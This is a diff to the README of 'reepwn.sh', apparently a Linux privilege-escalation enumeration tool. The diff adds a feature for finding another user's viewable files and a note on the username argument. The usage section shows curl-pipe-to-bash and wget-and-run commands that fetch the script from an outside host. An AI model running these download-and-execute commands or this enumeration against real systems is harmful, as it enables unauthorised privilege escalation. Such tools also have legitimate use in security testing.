@@ -15,6 +15,7 @@ Features
 - Finding root owned directories that you can write to
 - Finding root owned directories that your group can access
 - Finding root owned files that you can edit
+- Finding specific user files that you can view
 
 Usage
 -----
@@ -24,3 +25,9 @@ curl http://10.10.10.1:1234/reepwn.sh | bash
 or
 
 wget http://10.10.10.1:1234/reepwn.sh && chmod +x ./reepwn.sh && ./reepwn.sh
+
+Notes
+-----
+reepwn gets root-specific info by default. If you want info pertaining to a different user, you can go
+
+./reepwn.sh UsernameHere
